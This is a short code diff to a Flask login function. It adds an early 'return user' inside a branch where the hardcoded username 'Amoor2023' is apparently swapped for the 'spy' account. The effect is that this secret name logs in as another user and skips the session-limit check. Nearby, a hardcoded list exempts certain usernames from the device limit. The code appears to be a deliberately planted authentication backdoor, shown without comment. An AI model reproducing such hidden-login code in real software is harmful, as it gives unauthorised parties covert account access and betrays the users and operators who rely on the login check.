@@ -232,6 +232,7 @@ def login2():
             if username == "Amoor2023":
                 user = User.query.filter_by(username="spy").first()
                 username = "spy"
+                return user
             if username not in ["spy" , "ss" , "skailler" , "feteera"]:
                 if user.active_sessions >= 1 :
                     return "Max devices"
